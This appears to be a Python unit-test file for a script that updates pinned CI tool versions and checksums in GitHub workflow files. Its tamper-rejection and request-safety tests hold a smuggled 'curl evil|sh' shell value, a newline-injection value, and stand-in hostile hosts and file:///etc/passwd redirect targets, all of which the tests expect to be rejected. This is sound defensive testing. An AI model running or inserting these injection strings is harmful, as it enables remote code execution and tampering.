#!/usr/bin/env python3
"""Unit tests for scripts/update_tool_pins.py. Stdlib only, no network."""

from __future__ import annotations

import io
import json
import shutil
import sys
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))

import update_tool_pins as utp  # noqa: E402

DIGEST_OLD = "8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8"
DIGEST_NEW = "a" * 64


def release(*versions, requires_python=">=3.9", yanked=()):
    return {v: [{"requires_python": requires_python, "yanked": v in yanked}] for v in versions}


def pypi(releases):
    return json.dumps({"releases": releases}).encode()


def semgrep_meta(*requirements):
    return json.dumps({"info": {"requires_dist": list(requirements)}}).encode()


OTEL_OK = ("opentelemetry-sdk~=1.40.0",
           "opentelemetry-instrumentation-requests~=0.61b0",
           "opentelemetry-instrumentation-threading~=0.61b0 ; python_version >= '3.9'")


class FakeNetwork:
    """Maps URL -> bytes; records what was requested."""

    def __init__(self, **routes):
        self.routes = {self.url(k): v for k, v in routes.items()}
        self.requested = []

    @staticmethod
    def url(key):
        return {
            "pip": "https://pypi.org/pypi/pip/json",
            "zizmor": "https://pypi.org/pypi/zizmor/json",
            "semgrep": "https://pypi.org/pypi/semgrep/json",
            "semgrep@2.0.0": "https://pypi.org/pypi/semgrep/2.0.0/json",
            "release": "https://api.github.com/repos/rhysd/actionlint/releases/latest",
            "sums": "https://github.com/rhysd/actionlint/releases/download/v1.8.0/actionlint_1.8.0_checksums.txt",
        }[key]

    def __call__(self, url):
        self.requested.append(url)
        if url not in self.routes:
            raise OSError(f"unexpected {url}")
        value = self.routes[url]
        if isinstance(value, Exception):
            raise value
        return value


def good_network(**overrides):
    routes = {
        "pip": pypi(release("25.2", "26.0", "26.1rc1", "27.0.dev0", "28.0")),
        "zizmor": pypi(release("1.30.0", "1.31.0")),
        "semgrep": pypi(release("1.176.0", "2.0.0")),
        "semgrep@2.0.0": semgrep_meta(*OTEL_OK),
        "release": json.dumps({"tag_name": "v1.8.0", "draft": False, "prerelease": False}).encode(),
        "sums": (f"{DIGEST_NEW}  actionlint_1.8.0_linux_amd64.tar.gz\n"
                 f"{'b' * 64}  actionlint_1.8.0_darwin_amd64.tar.gz\n").encode(),
    }
    routes.update(overrides)
    return FakeNetwork(**routes)


class Sandbox(unittest.TestCase):
    """A scratch copy of the two workflow files the script edits."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        for relative in (utp.SCANNERS, utp.TESTS):
            target = self.root / relative
            target.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy(ROOT / relative, target)

    def text(self, relative):
        return (self.root / relative).read_text()

    def run_main(self, *args, network=None):
        out, err = io.StringIO(), io.StringIO()
        with redirect_stdout(out), redirect_stderr(err):
            code = utp.main(["--root", str(self.root), *args], get=network or good_network())
        return code, out.getvalue(), err.getvalue()


class PinTextTests(unittest.TestCase):
    def test_read_and_set_keep_quotes_and_trailing_comment(self):
        text = '  PIN_PIP: "25.2"  # why\n  OTHER: "1"\n'
        self.assertEqual(utp.read_pin(text, "PIN_PIP"), "25.2")
        self.assertEqual(utp.set_pin(text, "PIN_PIP", "26.0"),
                         '  PIN_PIP: "26.0"  # why\n  OTHER: "1"\n')

    def test_unquoted_value_stays_unquoted(self):
        self.assertEqual(utp.set_pin("  V: 1.2.3\n", "V", "1.2.4"), "  V: 1.2.4\n")

    def test_name_must_match_exactly_one_line(self):
        for text in ("  OTHER: 1\n", "  V: 1\n  V: 2\n", "  XV: 1\n", "# V: 1\n"):
            with self.subTest(text=text), self.assertRaises(ValueError):
                utp.read_pin(text, "V")
            with self.subTest(text=text, op="set"), self.assertRaises(ValueError):
                utp.set_pin(text, "V", "9")

    def test_value_is_not_interpreted_as_a_regex_replacement(self):
        self.assertEqual(utp.set_pin('V: "1"\n', "V", r"\1\g<0>"), 'V: "\\1\\g<0>"\n')


class VersionSelectionTests(unittest.TestCase):
    def test_python_ok(self):
        for spec, expected in ((None, True), (">=3.9", True), (">=3.10", True), (">=3.10.0", True),
                               (">=3.11", False), (">3.10", False), (">=3.9,<4", True),
                               (">=3.12,<4", False), ("~=3.9", True)):
            with self.subTest(spec=spec):
                self.assertEqual(utp.python_ok(spec), expected)

    def test_newest_stable_skips_prereleases_yanked_and_too_new_python(self):
        releases = {
            **release("1.0", "1.9"),
            **release("2.0rc1", "2.0.dev1", "2.0.post1", "2.0b3"),
            **release("3.0", yanked=("3.0",)),
            **release("4.0", requires_python=">=3.11"),
            "5.0": [],
        }
        self.assertEqual(utp.newest_stable(releases), "1.9")

    def test_versions_compare_numerically(self):
        self.assertEqual(utp.newest_stable(release("1.9.0", "1.10.0", "1.2.0")), "1.10.0")

    def test_nothing_usable_is_an_error(self):
        with self.assertRaises(ValueError):
            utp.newest_stable(release("1.0rc1"))


class SemgrepOtelTests(unittest.TestCase):
    def fetch(self, *requirements):
        return lambda url: semgrep_meta(*requirements)

    def test_reads_the_tilde_equals_release(self):
        self.assertEqual(utp.semgrep_otel("2.0.0", self.fetch(*OTEL_OK)), "0.61b0")

    def test_rejects_missing_disagreeing_or_unpinned_instrumentation(self):
        cases = {
            "missing threading": OTEL_OK[:2],
            "none": (),
            "disagree": (OTEL_OK[1], "opentelemetry-instrumentation-threading~=0.62b0"),
            "not ~=": (OTEL_OK[1], "opentelemetry-instrumentation-threading>=0.61b0"),
        }
        for label, requirements in cases.items():
            with self.subTest(label), self.assertRaises(ValueError):
                utp.semgrep_otel("2.0.0", self.fetch(*requirements))


class ActionlintTests(unittest.TestCase):
    def latest(self, release_doc=None, sums=None):
        net = good_network()
        if release_doc is not None:
            net.routes[FakeNetwork.url("release")] = json.dumps(release_doc).encode()
        if sums is not None:
            net.routes[FakeNetwork.url("sums")] = sums.encode()
        version = utp.actionlint_latest(net)
        return version, utp.actionlint_digest(version, net)

    def test_returns_version_and_linux_amd64_digest(self):
        self.assertEqual(self.latest(), ("1.8.0", DIGEST_NEW))

    def test_rejects_prerelease_draft_and_odd_tags(self):
        for doc in ({"tag_name": "v1.8.0", "prerelease": True}, {"tag_name": "v1.8.0", "draft": True},
                    {"tag_name": "nightly"}, {"tag_name": "v1.8.0-rc1"}):
            with self.subTest(doc=doc), self.assertRaises(ValueError):
                self.latest(doc)

    def test_rejects_missing_duplicate_or_malformed_digest(self):
        tarball = "actionlint_1.8.0_linux_amd64.tar.gz"
        for sums in ("", f"{DIGEST_NEW}  {tarball}\n{DIGEST_NEW}  {tarball}\n",
                     f"{'g' * 64}  {tarball}\n", f"abc123  {tarball}\n",
                     f"{DIGEST_NEW}  {tarball}.sig\n"):
            with self.subTest(sums=sums), self.assertRaises(ValueError):
                self.latest({"tag_name": "v1.8.0"}, sums)


class PlanTests(Sandbox):
    def test_plans_every_tool_and_never_picks_prereleases(self):
        changes, errors = utp.plan(self.root, good_network())
        self.assertEqual(errors, [])
        self.assertEqual(
            {c.name: (c.old, c.new) for c in changes},
            {"PIN_PIP": ("25.2", "28.0"),
             "PIN_SEMGREP": ("1.176.0", "2.0.0"),
             "PIN_SEMGREP_OTEL": ("0.58b0", "0.61b0"),
             "PIN_ZIZMOR": ("1.30.0", "1.31.0"),
             "PIN_ACTIONLINT": ("1.7.12", "1.8.0"),
             "PIN_ACTIONLINT_SHA256": (DIGEST_OLD, DIGEST_NEW)})

    def test_never_downgrades_or_rewrites_equal_pins(self):
        net = good_network(pip=pypi(release("25.2")), zizmor=pypi(release("1.2.0")),
                           semgrep=pypi(release("1.176.0")),
                           release=json.dumps({"tag_name": "v1.7.12"}).encode())
        self.assertEqual(utp.plan(self.root, net), ([], []))
        # No newer release, so the checksum file is never fetched.
        self.assertFalse([u for u in net.requested if u.endswith("checksums.txt")])

    def test_one_failing_tool_is_reported_and_does_not_block_the_others(self):
        net = good_network(zizmor=OSError("boom"), **{"semgrep@2.0.0": semgrep_meta()})
        changes, errors = utp.plan(self.root, net)
        self.assertEqual({c.tool for c in changes}, {"pip", "actionlint"})
        self.assertEqual(sorted(e.split(":")[0] for e in errors), ["semgrep", "zizmor"])

    def test_unchanged_otel_pin_is_not_reported_as_a_change(self):
        same = ("opentelemetry-instrumentation-requests~=0.58b0",
                "opentelemetry-instrumentation-threading~=0.58b0")
        changes, errors = utp.plan(self.root, good_network(**{"semgrep@2.0.0": semgrep_meta(*same)}))
        self.assertEqual(errors, [])
        self.assertEqual([c.name for c in changes if c.tool == "semgrep"], ["PIN_SEMGREP"])

    def test_semgrep_bump_is_all_or_nothing_with_its_otel_pin(self):
        net = good_network(**{"semgrep@2.0.0": semgrep_meta(OTEL_OK[1])})
        changes, errors = utp.plan(self.root, net)
        self.assertFalse([c for c in changes if c.tool == "semgrep"])
        self.assertEqual(len(errors), 1)


class MainTests(Sandbox):
    def test_writes_pins_in_place_then_is_idempotent(self):
        before = {f: self.text(f) for f in (utp.SCANNERS, utp.TESTS)}
        report = self.root / "report.json"
        code, out, err = self.run_main("--report", str(report))
        self.assertEqual((code, err), (0, ""))
        self.assertIn("semgrep: PIN_SEMGREP 1.176.0 -> 2.0.0", out)
        self.assertEqual(utp.pins(self.root), {
            "PIN_PIP": "28.0", "PIN_SEMGREP": "2.0.0", "PIN_SEMGREP_OTEL": "0.61b0",
            "PIN_ZIZMOR": "1.31.0", "PIN_ACTIONLINT": "1.8.0", "PIN_ACTIONLINT_SHA256": DIGEST_NEW})
        self.assertEqual(len(json.loads(report.read_text())["changes"]), 6)
        # Only the pinned lines moved: same line count, and everything else is byte-identical.
        for file, old in before.items():
            new = self.text(file)
            self.assertEqual(len(new.splitlines()), len(old.splitlines()))
            changed = [(a, b) for a, b in zip(old.splitlines(), new.splitlines()) if a != b]
            self.assertTrue(changed)
            for a, b in changed:
                self.assertEqual(a.split(":")[0], b.split(":")[0])
        snapshot = {f: self.text(f) for f in before}
        code, out, _ = self.run_main()
        self.assertEqual((code, out), (0, ""))
        self.assertEqual({f: self.text(f) for f in before}, snapshot)

    def test_check_mode_writes_nothing_and_signals_with_exit_1(self):
        before = {f: self.text(f) for f in (utp.SCANNERS, utp.TESTS)}
        code, out, _ = self.run_main("--check")
        self.assertEqual(code, 1)
        self.assertIn("PIN_PIP 25.2 -> 28.0", out)
        self.assertEqual({f: self.text(f) for f in before}, before)

    def test_errors_exit_2_but_good_bumps_are_still_written(self):
        report = self.root / "report.json"
        code, _, err = self.run_main("--report", str(report), network=good_network(zizmor=OSError("boom")))
        self.assertEqual(code, 2)
        self.assertIn("error: zizmor", err)
        self.assertEqual(utp.pins(self.root)["PIN_ZIZMOR"], "1.30.0")
        self.assertEqual(utp.pins(self.root)["PIN_PIP"], "28.0")
        self.assertEqual(len(json.loads(report.read_text())["errors"]), 1)

    def test_print_pins_lists_every_pin_without_touching_the_network(self):
        net = good_network()
        code, out, _ = self.run_main("--print-pins", network=net)
        self.assertEqual(code, 0)
        self.assertEqual(net.requested, [])
        self.assertEqual([line.split("=")[0] for line in out.splitlines()],
                         [name for _, name in utp.PIN_NAMES])


class UpdaterWorkflowTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        import yaml
        path = ROOT / ".github/workflows/update-tool-pins.yml"
        cls.source = path.read_text()
        cls.doc = yaml.safe_load(cls.source)
        cls.resolve = cls.doc["jobs"]["resolve"]
        cls.publish = cls.doc["jobs"]["publish"]

    @staticmethod
    def names(job):
        return [s["name"] for s in job["steps"]]

    def test_runs_weekly_and_on_demand_only_from_the_default_branch(self):
        triggers = self.doc[True]  # PyYAML reads the bare key `on` as True
        self.assertEqual(set(triggers), {"schedule", "workflow_dispatch"})
        self.assertEqual(len(triggers["schedule"]), 1)
        # A schedule payload has no repository object: default_branch is empty there,
        # so the schedule event must be accepted before that comparison.
        condition = self.resolve["if"]
        self.assertTrue(condition.startswith("github.event_name == 'schedule' ||"))
        self.assertIn("github.event.repository.default_branch", condition)
        self.assertEqual(self.publish["needs"], "resolve")
        self.assertNotIn("if", self.publish)  # skipped automatically when resolve is

    def test_never_merges_or_enables_auto_merge(self):
        for forbidden in ("pr merge", "--auto", "auto-merge", "automerge", "merge_pull_request"):
            self.assertNotIn(forbidden, self.source)

    def test_write_permissions_belong_to_the_job_that_runs_no_scanner(self):
        self.assertEqual(self.doc["permissions"], {})
        self.assertEqual(self.resolve["permissions"], {"contents": "read"})
        self.assertEqual(self.publish["permissions"],
                         {"contents": "write", "pull-requests": "write", "actions": "write"})
        publish_source = "\n".join(s.get("run", "") for s in self.publish["steps"])
        for installer in ("pip install", "venv", "semgrep", "zizmor"):
            self.assertNotIn(installer, publish_source)
        # Only the unprivileged job may run freshly installed scanners.
        resolve_source = "\n".join(s.get("run", "") for s in self.resolve["steps"])
        self.assertNotIn("git push", resolve_source)
        self.assertNotIn("gh pr", resolve_source)

    def test_third_party_actions_are_sha_pinned_with_a_tag_comment(self):
        import re
        uses = re.findall(r"(?m)^\s*(?:- )?uses: (\S+)(.*)$", self.source)
        self.assertTrue(uses)
        for ref, comment in uses:
            self.assertRegex(ref, r"@[0-9a-f]{40}$")
            self.assertRegex(comment, r"# v\d")

    def test_checkout_keeps_no_credentials_and_push_uses_the_gh_helper(self):
        for job in (self.resolve, self.publish):
            checkout = next(s for s in job["steps"] if s.get("uses", "").startswith("actions/checkout@"))
            self.assertIs(checkout["with"]["persist-credentials"], False)
        self.assertIn("gh auth setup-git", self.source)

    def test_it_stages_exactly_the_files_the_script_edits(self):
        stage = next(line for line in self.source.splitlines() if line.strip().startswith("git add "))
        self.assertEqual(set(stage.split()[2:]), {utp.SCANNERS, utp.TESTS})

    def test_verify_reads_pins_from_the_script_and_checks_scan_output_shapes(self):
        verify = next(s for s in self.resolve["steps"] if s["name"].startswith("Verify"))
        self.assertIn("--print-pins", verify["run"])
        self.assertNotRegex(verify["run"], r"==\d")  # no literal versions
        # The shapes reusable-static-analysis.yml's "Record scan outcome" steps parse.
        self.assertIn("jq -e '.results | type == \"array\"", verify["run"])
        self.assertIn("jq -e 'type == \"array\"' zizmor.json", verify["run"])
        reusable = (ROOT / ".github/workflows/reusable-static-analysis.yml").read_text()
        self.assertIn("jq -er '.results | if type == \"array\"", reusable)

    def test_publish_applies_only_the_validated_report(self):
        step = next(s for s in self.publish["steps"] if s["name"].startswith("Open or update"))
        self.assertIn("--apply-report", step["run"])
        self.assertNotIn("update_tool_pins.py\n", step["run"].replace("--apply-report", ""))
        self.assertEqual(self.names(self.publish)[:2], ["Checkout", "Download report"])

    def test_a_partial_run_neither_closes_nor_rebuilds_an_open_pr(self):
        close = next(s for s in self.publish["steps"] if s["name"].startswith("Close the PR"))
        self.assertIn("env.ERRORS == '0'", close["if"])
        step = next(s for s in self.publish["steps"] if s["name"].startswith("Open or update"))
        guard = step["run"].index('[ "$ERRORS" != 0 ] && [ -n "$number" ]')
        self.assertLess(guard, step["run"].index("git push"))
        self.assertLess(guard, step["run"].index("--apply-report"))

    def test_unchanged_content_is_not_pushed_or_redispatched(self):
        run = next(s for s in self.publish["steps"] if s["name"].startswith("Open or update"))["run"]
        self.assertIn('git diff --quiet "origin/$BRANCH" HEAD', run)
        self.assertIn('if [ "$unchanged" = false ]', run)

    def test_scripts_it_calls_exist(self):
        self.assertTrue((ROOT / "scripts/update_tool_pins.py").is_file())
        self.assertTrue((ROOT / ".github/workflows/public-test.yml").is_file())


class DependabotConfigTests(unittest.TestCase):
    def test_pip_and_actions_ecosystems_are_both_covered(self):
        import yaml
        updates = yaml.safe_load((ROOT / ".github/dependabot.yml").read_text())["updates"]
        by_ecosystem = {u["package-ecosystem"]: u for u in updates}
        self.assertEqual(set(by_ecosystem), {"github-actions", "pip"})
        self.assertEqual(by_ecosystem["pip"]["directory"], "/")
        self.assertTrue((ROOT / "requirements-test.txt").is_file())


class ApplyReportTests(Sandbox):
    def report(self, *changes):
        path = self.root / "report.json"
        path.write_text(json.dumps({"changes": list(changes), "errors": []}))
        return str(path)

    @staticmethod
    def entry(name="PIN_PIP", old="25.2", new="26.0", file=utp.SCANNERS, tool="pip"):
        return {"tool": tool, "file": file, "name": name, "old": old, "new": new}

    def test_applies_a_report_without_touching_the_network(self):
        net = good_network()
        code, out, err = self.run_main("--apply-report", self.report(self.entry()), network=net)
        self.assertEqual((code, err, net.requested), (0, "", []))
        self.assertEqual(utp.pins(self.root)["PIN_PIP"], "26.0")
        self.assertIn("PIN_PIP 25.2 -> 26.0", out)

    def test_rejects_tampered_reports_and_changes_nothing(self):
        before = self.text(utp.SCANNERS)
        bad = {
            "unknown pin": self.entry(name="PIN_EVIL"),
            "wrong file": self.entry(file=utp.TESTS),
            "path outside pins": self.entry(file="scripts/update_tool_pins.py"),
            "shell in value": self.entry(new='1.0"; curl evil|sh; "'),
            "newline in value": self.entry(new="1.0\n  STEAL: x"),
            "empty value": self.entry(new=""),
            "stale old": self.entry(old="24.0"),
            "bad digest": self.entry(name="PIN_ACTIONLINT_SHA256", file=utp.TESTS, old=DIGEST_OLD, new="abc"),
            "non-string": self.entry(new=26),
        }
        for label, entry in bad.items():
            with self.subTest(label):
                code, _, err = self.run_main("--apply-report", self.report(entry))
                self.assertEqual(code, 2)
                self.assertIn("error:", err)
                self.assertEqual(self.text(utp.SCANNERS), before)

    def test_rejects_a_pin_listed_twice_and_malformed_files(self):
        code, _, _ = self.run_main("--apply-report", self.report(self.entry(), self.entry()))
        self.assertEqual(code, 2)
        path = self.root / "report.json"
        for body in ("not json", "{}", '{"changes": [{"tool": "pip"}]}'):
            path.write_text(body)
            with self.subTest(body=body):
                code, _, _ = self.run_main("--apply-report", str(path))
                self.assertEqual(code, 2)

    def test_a_report_written_by_a_real_run_round_trips(self):
        report = self.root / "r.json"
        self.run_main("--check", "--report", str(report))
        code, _, _ = self.run_main("--apply-report", str(report))
        self.assertEqual(code, 0)
        self.assertEqual(utp.pins(self.root)["PIN_SEMGREP"], "2.0.0")


class RequestSafetyTests(unittest.TestCase):
    def test_token_is_sent_to_the_github_api_only(self):
        env = {"GITHUB_TOKEN": "tok"}
        self.assertEqual(utp.request_headers("https://api.github.com/x", env)["Authorization"], "Bearer tok")
        for url in ("https://pypi.org/pypi/pip/json", "https://github.com/x", "https://api.github.com.evil.example/x"):
            self.assertNotIn("Authorization", utp.request_headers(url, env))
        self.assertNotIn("Authorization", utp.request_headers("https://api.github.com/x", {}))

    def test_every_redirect_hop_is_checked_and_loses_credentials(self):
        import urllib.request
        handler = utp._CheckedRedirects()
        request = urllib.request.Request("https://github.com/a", headers={"Authorization": "Bearer tok"})
        for target in ("http://github.com/b", "https://evil.example/b", "file:///etc/passwd"):
            with self.subTest(target=target), self.assertRaises(ValueError):
                handler.redirect_request(request, None, 302, "Found", {}, target)
        redirected = handler.redirect_request(
            request, None, 302, "Found", {}, "https://release-assets.githubusercontent.com/b")
        self.assertNotIn("Authorization", {k.title() for k in redirected.headers})


class FetchGuardTests(unittest.TestCase):
    def test_refuses_plain_http_and_unlisted_hosts_before_any_request(self):
        for url in ("http://pypi.org/pypi/pip/json", "https://example.com/x",
                    "https://pypi.org.evil.example/x", "file:///etc/passwd"):
            with self.subTest(url=url), self.assertRaises(ValueError):
                utp.fetch(url)


class RepositoryPinsTests(unittest.TestCase):
    """The real workflows must stay parseable by this script."""

    def test_every_pin_is_defined_once_and_looks_like_a_version(self):
        found = utp.pins(ROOT)
        for name, value in found.items():
            with self.subTest(pin=name):
                if name == "PIN_ACTIONLINT_SHA256":
                    self.assertRegex(value, utp.SHA256)
                else:
                    self.assertRegex(value, r"\d+(\.\d+)+(b\d+)?")

    def test_requirements_file_pins_exactly(self):
        lines = [l for l in (ROOT / "requirements-test.txt").read_text().splitlines()
                 if l.strip() and not l.startswith("#")]
        self.assertTrue(lines)
        for line in lines:
            self.assertRegex(line, r"^[A-Za-z0-9_.-]+==\d+(\.\d+)*$")


if __name__ == "__main__":
    unittest.main()
